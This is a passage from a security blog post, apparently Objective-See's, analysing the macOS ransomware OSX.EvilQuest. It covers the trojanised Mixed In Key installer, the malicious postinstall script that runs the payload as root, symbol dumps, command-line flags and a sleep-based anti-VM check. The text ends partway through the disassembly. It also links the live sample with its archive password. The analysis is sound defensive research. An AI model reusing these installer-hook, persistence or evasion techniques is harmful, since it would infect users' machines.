<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x59/blockblock.png />
<meta name="twitter:title" content=OSX.EvilQuest&#32;Uncovered />
<meta name="twitter:description" content=part&#32;i:&#32;infection,&#32;persistence,&#32;and&#32;more! />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=OSX.EvilQuest&#32;Uncovered />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x59/blockblock.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">OSX.EvilQuest Uncovered</div>
  <div class="blogSubTitle">part i: infection, persistence, and more!</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / June 29, 2020</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; margin-bottom: 15px; font-size: 15px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:
    <br>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.airoav.com/" style="text-decoration: none;">
      <img src="../images/friends/airo.png" height="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Airo AV
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/EvilQuest.zip">sample</a> (&lsquo;OSX.EvilQuest&rsquo;) to our malware collection (password: infect3d)</p>
<p>&hellip;please don&rsquo;t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Early today, the noted Malware researcher <a href="https://twitter.com/dineshdina04">Dinesh Devadoss</a> tweeted about a new piece of macOS malware with ransomware tendencies &ldquo;<i>impersonating as Google Software Update program with zero detection.</i>&rdquo;:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/macOS?src=hash&amp;ref_src=twsrc%5Etfw">#macOS</a> <a href="https://twitter.com/hashtag/ransomware?src=hash&amp;ref_src=twsrc%5Etfw">#ransomware</a> impersonating as Google Software Update program with zero detection. <br><br>MD5: <br>522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790 98638D7CD7FE750B6EAB5B46FF102ABD<a href="https://twitter.com/philofishal?ref_src=twsrc%5Etfw">@philofishal</a> <a href="https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw">@patrickwardle</a> <a href="https://twitter.com/thomasareed?ref_src=twsrc%5Etfw">@thomasareed</a> <a href="https://t.co/r5tkmfzmFT">pic.twitter.com/r5tkmfzmFT</a></p>&mdash; Dinesh_Devadoss (@dineshdina04) <a href="https://twitter.com/dineshdina04/status/1277668001538433025?ref_src=twsrc%5Etfw">June 29, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>It&rsquo;s not everyday that a new piece of malware/ransomware is uncovered that targets macOS. Moreover, as my <a href="https://objective-see.com/products/ransomwhere.html">RansomWhere?</a> tool claims to be able to generically detect such threats, I decided to take a anlayze the malware and confirm the tool does indeed detect it (with no a priori knowledge).</p>
<p>In this first part of this two-part blog post series, we&rsquo;ll discuss the malware&rsquo;s infection vector, and perform an initial triage to uncover its persistence, and anti-analysis logic. In <a href="blog_0x60.html">part two</a>, we&rsquo;ll detect the capabilities of this insidious threat.</p>
<h3 id="infection-vector">Infection Vector</h3>
<p>From Dinesh&rsquo;s <a href="https://twitter.com/dineshdina04/status/1277668001538433025">tweet</a>, it was not apparent how the ransomware was able to infect macOS users. However, <a href="https://twitter.com/thomasareed?lang=en">Thomas Reed</a> of Malwarebytes (and Objective by the Sea speaker!), noted that the malware had been found in pirated versions of popular macOS software, shared on popular torrent sites.</p>
<p>This method of infection, though relatively unsophisticated is somewhat common, thus indicating it is (at least at some level) successful. Other examples of macOS malware spreading via infected torrents include:</p>
<ul>
<li>
<p><a href="https://www.virusbulletin.com/uploads/pdf/magazine/2014/vb201410-iWorm.pdf">OSX.iWorm</a>:
<img src="../images/blog/blog_0x59/iWorm.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
</li>
<li>
<p><a href="https://www.intego.com/mac-security-blog/osxshlayer-new-mac-malware-comes-out-of-its-shell/">OSX.Shlayer</a>:</p>
</li>
</ul>
<blockquote>
<p>&ldquo;<i>Intego researchers found OSX/Shlayer spreading via BitTorrent file sharing sites, appearing as a fake Flash Player update when a user attempts to select a link to copy a torrent magnet link.</i>&rdquo;</p>
</blockquote>
<div class="note">
Ethical reasons aside, it's generally unwise to install pirated software, as it is often infected with malware. 
<p>&ldquo;Torrent sites are notorious for distributing malware and adware, sometimes through misleading advertisements, and sometimes through Trojan horse downloads that claim to be &lsquo;cracks&rsquo; or that may contain infected copies of legitimate software&rdquo; -Intego</p>
</div>
<p>The sample we&rsquo;ll be analyzing today, is packaged in a (pirated?) version of the popular DJ software <a href="https://mixedinkey.com/">Mixed In Key</a>. The malicious package is unsigned:</p>
<img src="../images/blog/blog_0x59/unsigned.png"  width="90%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;meaning macOS will prompt the user before allowing it to be opened:</p>
<img src="../images/blog/blog_0x59/warning.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>However, macOS users attempting to pirate software may likely ignore this warning, pressing onwards ensuring infection commences.</p>
<h3 id="analysis">Analysis</h3>
<p>As noted, the ransomware is distributed via trojanzied installers. The sample we&rsquo;ll dive into, is distributed via a disk image named <code>Mixed In Key 8.dmg</code> (<code>SHA1: 98040c4d358a6fb9fed970df283a9b25f0ab393b</code>).</p>
<p>Currently this disk image is not flagged by any of the anti-virus engines on <a href="https://www.virustotal.com/gui/file/b34738e181a6119f23e930476ae949fc0c7c4ded6efa003019fa946c4e5b287a/detection">VirusTotal</a>, (though this is likely to change as AV engines update their signature databases):</p>
<img src="../images/blog/blog_0x59/vt.png"  width="90%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>We can mount this disk image, via the <code>hdiutil</code> utility:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ hdiutil attach ~/Downloads/Mixed\ In\ Key\ 8.dmg 
/dev/disk2            GUID_partition_scheme           
/dev/disk2s1          Apple_APFS                      
/dev/disk3            EF57347C-0000-11AA-AA11-0030654 
/dev/disk3s1          41504653-0000-11AA-AA11-0030654 /Volumes/Mixed In Key 8

</pre>
</div>
<p>The mounted disk image (&rsquo;/Volumes/Mixed In Key 8/&rsquo;) contains a installer package <code>Mixed In Key 8.pkg</code>:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ls /Volumes/Mixed\ In\ Key\ 8/
Mixed In Key 8.pkg
</pre>
</div></p>
<p>My favorite tool for statically analyzing (and extracting files from) a package is <a href="https://mothersruin.com/software/SuspiciousPackage/"><code>Suspicious Package</code></a>:</p>
<img src="../images/blog/blog_0x59/open.png"  width="90%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Once opened in <code>Suspicious Package</code>, we find the (pirated?) <code>Mixed In Key 8</code> application and binary named &ldquo;<code>patch</code>&rdquo;:
<img src="../images/blog/blog_0x59/files.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>Clicking on the &lsquo;postinstall&rsquo; tab, we find a post install script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>mkdir /Library/mixednkey
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>mv /Applications/Utils/patch /Library/mixednkey/toolroomd
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>rmdir /Application/Utils
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>chmod +x /Library/mixednkey/toolroomd
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>/Library/mixednkey/toolroomd &amp;</span></span></code></pre></div>
<p>In short, after creating the <code>/Library/mixednkey</code> directory, it moves a binary named <code>patch</code> into this directory, sets it to be executable, and launches it.</p>
<p>As the installer requests root privileges during the install, this script (and thus the <code>toolroomd</code> binary) will also run with root privileges:</p>
<img src="../images/blog/blog_0x59/install.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Via dynamic analysis monitoring tools (such as a file and process monitor) we can passively observe the installation process:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# procInfo 
[process start]

pid: 536
path: /bin/sh
user: 0
args: (
    "/bin/sh",
    "/tmp/PKInstallSandbox.NY2QC8/Scripts/com.mixedinkey.installer.mCoJoP/postinstall",
    "/Users/user/Downloads/Mixed In Key 8.pkg",
    "/Applications",
    "/",
    "/"
)
...

# fs_usage -w -f filesystem

mkdir     /Library/mixednkey mkdir.5164
...

rename    /Applications/Utils/patch  mv.5167
...

fstatat64 /Library/mixednkey/toolroomd  chmod.5171

</pre>
</div>
<p>Using <code>Suspicious Package</code> we can extract both the <code>Mixed In Key 8</code> application and the binary named &ldquo;<code>patch</code>.
As the <code>Mixed In Key 8</code> binary is (still) validly signed by the <code>Mixed In Key</code> developers, it is likely pristine and unmodified:</p>
<img src="../images/blog/blog_0x59/signed.png"  width="90%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;as such, we turn our attention to the <code>toolroomd</code> binary.</p>
<p>The <code>toolroomd</code> binary (originally called <code>patch</code>) is a 64-bit unsigned Mach-O executable:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file patch
patch: Mach-O 64-bit executable x86_64

$ codesign -dvv patch 
patch: code object is not signed at all

$ shasum -a1 patch
efbb681a61967e6f5a811f8649ec26efe16f50ae  patch

</pre>
</div>
<p>Next, we run the <code>strings</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ string - patch

2Uy5DI3hMp7o0cq|T|14vHRz0000013
0ZPKhq0rEeUJ0GhPle1joWN30000033
0rzACG3Wr||n1dHnZL17MbWe0000013

system.privilege.admin

%s --reroot
--silent
--noroot
--ignrp

_generate_xkey

/toidievitceffe/libtpyrc/tpyrc.c
bits <= 1024

_get_process_list
/toidievitceffe/libpersist/persist.c

[return]
[tab]
[del]
[esc]
[right-cmd]
[left-cmd]
[left-shift]
[caps]
[left-option]

</pre>
</div>
<p>From the <code>strings</code> output, we find obfuscated strings, plus some that appear related to command line arguments, file encryption, and perhaps keylogging(?).</p>
<p>Via the <code>nm</code> utility, we can dump the names of symbols (including function names):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ nm patch
                 U _CGEventGetIntegerValueField
                 U _CGEventTapCreate
                 U _CGEventTapEnable

                 U _NSAddressOfSymbol
                 U _NSCreateObjectFileImageFromMemory
                 U _NSDestroyObjectFileImage
                 U _NSLinkModule
                 U _NSLookupSymbolInModule
                 U _NSUnLinkModule
                 U _NXFindBestFatArch

0000000100002900 T __construct_plist_path
000000010000a7e0 T __dispatch
0000000100009c20 T __ei_init_crc32_tab
000000010000b490 T __ei_rootgainer_elevate
00000001000061c0 T __generate_xkey
000000010000a550 T __get_host_identifier
0000000100007c40 T __get_process_list
00000001000094d0 T __home_stub
000000010000e0c0 T __is_target
000000010000ecb0 T __make_temp_name
0000000100000000 T __mh_execute_header
0000000100004910 T __pack_trailer
000000010000a170 T __react_exec
000000010000a160 T __react_host
000000010000a470 T __react_keys
000000010000a500 T __react_ping
000000010000a300 T __react_save
0000000100009e80 T __react_scmd
000000010000a460 T __react_start
00000001000072d0 T __rotate
00000001000068a0 T __tp_decrypt
0000000100006610 T __tp_encrypt
00000001000049c0 T __unpack_trailer
0000000100002550 T _acquire_root

                 U _connect
00000001000085a0 T _create_rescue_executable
000000010000ba50 T _ei_carver_main
0000000100001590 T _ei_forensic_sendfile
0000000100001680 T _ei_forensic_thread
0000000100005b00 T _ei_get_host_info
0000000100006050 T _ei_get_macaddr
000000010000b9b0 T _ei_loader_main
000000010000c9a0 T _ei_loader_thread
0000000100009650 T _ei_pers_thread
000000010000b880 T _ei_persistence_main
0000000100001c30 T _ei_read_spot
000000010000b580 T _ei_rootgainer_main
0000000100003670 T _ei_run_file
0000000100003790 T _ei_run_memory_hrd
0000000100009550 T _ei_run_thread
0000000100001a10 T _ei_save_spot
000000010000b710 T _ei_selfretain_main

000000010000de60 T _eib_decode
000000010000dd40 T _eib_encode
000000010000dc40 T _eib_pack_c
000000010000e010 T _eib_secure_decode
000000010000dfa0 T _eib_secure_encode
0000000100013660 D _eib_string_fa
0000000100013708 S _eib_string_key
000000010000dcb0 T _eib_unpack_i

0000000100007570 T _eip_decrypt
0000000100007310 T _eip_encrypt
0000000100007130 T _eip_key
00000001000071f0 T _eip_seeds
 

0000000100007aa0 T _is_debugging
0000000100007bc0 T _is_virtual_mchn

0000000100002dd0 T _lfsc_dirlist
00000001000032c0 T _lfsc_get_contents
000000010000fa50 T _lfsc_match
00000001000033e0 T _lfsc_pack_binary
000000010000f720 T _lfsc_parse_template
0000000100003500 T _lfsc_unpack_binary


0000000100008810 T _persist_executable
0000000100008df0 T _persist_executable_frombundle
                 U _popen
0000000100007c20 T _prevent_trace


</pre>
</div>
<p>Ohh, the plot thickens! From this <code>nm</code> output, we seen methods and function names related to:</p>
<ul>
<li>
<p>keylogging?
<code>_CGEventTapCreate</code>, <code>_CGEventTapEnable</code>, etc.</p>
</li>
<li>
<p>in-memory code execution?
<code>_NSCreateObjectFileImageFromMemory</code>, <code>_NSLinkModule</code>, etc.</p>
</li>
<li>
<p>anti-analysis?
<code>_is_debugging</code>, <code>_is_virtual_mchn</code></p>
</li>
<li>
<p>survey?
<code>__get_host_identifier</code>, <code>__get_process_list</code>, etc.</p>
</li>
<li>
<p>persistence
<code>_persist_executable</code>, <code>_persist_executable_frombundle</code></p>
</li>
<li>
<p>encryption (ransom)
<code>_eip_encrypt</code></p>
</li>
</ul>
<p>&hellip;seems more than &ldquo;just&rdquo; a simple piece of ransomware!</p>
<p>Time to disassemble/debug the <code>patch</code> binary</p>
<p>The core logic of the <code>patch</code> (or <code>toolroomd</code>) binary occurs within it&rsquo;s main function.</p>
<p>First, it parses any commandline parameters looking for <code>--silent</code>, <code>--noroot</code>, and <code>--ignrp</code>.</p>
<ul>
<li>
<p><code>--silent</code>
<br>
If <code>--silent</code> is passed in via the command line, it sets a value to zero. This appears to instruct the malware to run &ldquo;silently&rdquo;, for example suppressing the printing out error messages.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span>C375 cmp     [rbp<span style="color:#f92672">+</span>silent], <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span>C379 jnz     skipErrMsg
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">000000010000</span>C389  lea     rdi, <span style="color:#e6db74">&#34;This application has to be run by root&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>__text:<span style="color:#ae81ff">000000010000</span>C396  call    _printf</span></span></code></pre></div>
<br>
This flag is passed to the <code>ei_rootgainer_main</code> function, which influences how the malware (running as a normal user) may request root privileges:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span>C2EB   lea     rdx, [rbp<span style="color:#f92672">+</span>silent]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span>C2EF   lea     rcx, [rbp<span style="color:#f92672">+</span>var_34]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">000000010000</span>C2F3   call    _ei_rootgainer_main</span></span></code></pre></div>
<br>
Interestingly this flag is explicitly initialized to zero, an set to zero again if the <code>--silent</code> is specified, though appears to never be set to 1. Thus the malware will <em>alway</em> run in &ldquo;silent&rdquo; mode, even if <code>--silent</code> is not specified. 🤷🏽‍♂️</p>
</li>
<li>
<p><code>--noroot</code>
<br>
If <code>--noroot</code> is passed in via the command line, it sets a value to one. Various code within the malware then checks this flag, and if set (to 1) takes different action &hellip;for example skipping the request for root privileges:<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span>C2D6                 cmp     [rbp<span style="color:#f92672">+</span>noRoot], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span>C2DA                 jnz     noRequestForRoot
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">000000010000</span>C2F3                 call    _ei_rootgainer_main</span></span></code></pre></div>
<br>
This flag is also passed to a persistence function, to influence how the malware is persisted (as a launch daemon, or a launch agent):
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span>C094                 mov     ecx, [rbp<span style="color:#f92672">+</span>noRoot]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span>C097                 mov     r8d, [rbp<span style="color:#f92672">+</span>var_24]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">000000010000</span>C09B                 call    _ei_persistence_main</span></span></code></pre></div></p>
</li>
<li>
<p><code>--ignrp</code>
<br>
If <code>--ignrp</code> is passed in via the command line, it sets a value to one, and instructs the malware not to persist (&ldquo;ignore persistence&rdquo;).
<br>
<br>
For example in the <code>ei_selfretain_main</code> function (that persists the malware), this flag is checked. If it&rsquo;s not set, the function simply returns without persisting the malware:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span>B786                 cmp     [rbp<span style="color:#f92672">+</span>ignorePersistence], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span>B78A                 jz      leave</span></span></code></pre></div></p>
</li>
</ul>
<p>Once the malware has parse its command line options, it executes a function named <code>is_virtual_mchn</code>, and exits if it returns true:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span>(is_virtual_mchn(<span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    exit();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}</span></span></code></pre></div>
<p>Let&rsquo;s take a closer look at this function, as we want to make sure it doesn&rsquo;t detect our debugging session in a virtual machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_is_virtual_mchn</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    var_10 <span style="color:#f92672">=</span> time();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    sleep(argO);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    rax <span style="color:#f92672">=</span> time();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">-</span> var_10 <span style="color:#f92672">&lt;</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    rax <span style="color:#f92672">=</span> rdx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">return</span> rax;
